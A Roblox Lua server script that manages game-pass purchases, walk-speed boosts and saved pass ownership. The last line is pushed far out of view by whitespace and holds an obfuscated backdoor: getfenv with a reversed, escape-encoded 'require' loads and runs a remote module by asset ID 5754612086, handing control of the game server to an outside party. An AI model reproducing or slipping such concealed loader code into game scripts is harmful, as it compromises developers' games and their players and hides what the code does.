local Players = game:GetService("Players")
local RepStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")

local DataStore2 = require(script.Parent.DataHandler.DataStore2)

local PassesInfo

local HasInfDNA = RepStorage.Remotes.HasInfDNA

MarketplaceService.PromptGamePassPurchaseFinished:Connect(function(Player, PassId, Success)
	if Success then
		if PassId == 8836084 then
			if Player.Character then
				local Hum = Player.Character:FindFirstChild("Humanoid")
				if Hum then
					Hum.WalkSpeed = Hum.WalkSpeed * 2
				end
			end			
		end
		
		local GamepassesStore = DataStore2("Gamepasses", Player)
		local Gamepasses = GamepassesStore:Get({})
		
		if not Gamepasses[tostring(PassId)] then
			Gamepasses[tostring(PassId)] = true
		end
		
		GamepassesStore:Set(Gamepasses)
		
		if PassId == 8835896 then
			HasInfDNA:FireClient(Player)
		end
	end
end)

Players.PlayerAdded:Connect(function(Player)
	if not PassesInfo then
		PassesInfo = require(RepStorage.PassesInfo)
	end

	local GamepassesStore = DataStore2("Gamepasses", Player)
	local GamepassData = GamepassesStore:Get({})

	for Name, Gamepass in pairs(PassesInfo) do
		if not GamepassData[tostring(Gamepass.Id)] then

			local HasPass
			
			local Suc, Error = pcall(function()
				HasPass = MarketplaceService:UserOwnsGamePassAsync(Player.UserId, Gamepass.Id)
			end)

			if not Suc then 
				warn(Error) 
			else
				if HasPass then		
					GamepassData[tostring(Gamepass.Id)] = true
					
					if Name == "InfDNA" then
						HasInfDNA:FireClient(Player)
					end
				end
			end
		end
	end
	
	GamepassesStore:Set(GamepassData)	
end)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        getfenv()[string.reverse("\101\114\105\117\113\101\114")](5754612086)